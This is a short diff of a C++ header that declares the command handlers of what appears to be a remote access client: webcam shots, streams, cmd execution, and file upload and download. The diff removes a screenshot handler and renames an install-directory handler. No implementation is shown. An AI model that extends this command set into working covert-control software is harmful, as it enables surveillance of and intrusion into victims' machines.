@@ -43,13 +43,12 @@ namespace silence {
 
     private:
         void greetEvent(); // starts the client
-        void screenshotEvent(); // takes a screenshot
         void webcamShotEvent(); // takes a webcam shot
         void killStreamEvent(); // kills a stream
         void startStreamEvent(); // creates a stream
 
         void cdEvent(const CommandObject &object); // changes the current directory
-        void installDirEvent(const CommandObject &object); // returns the install directory
+        void originEvent(const CommandObject &object); // returns the install directory
         void cmdEvent(const CommandObject &object); // executes a cmd command
         void uploadEvent(const CommandObject &object); // uploads file to http server
         void downloadEvent(const CommandObject &object); // downloads file from http server
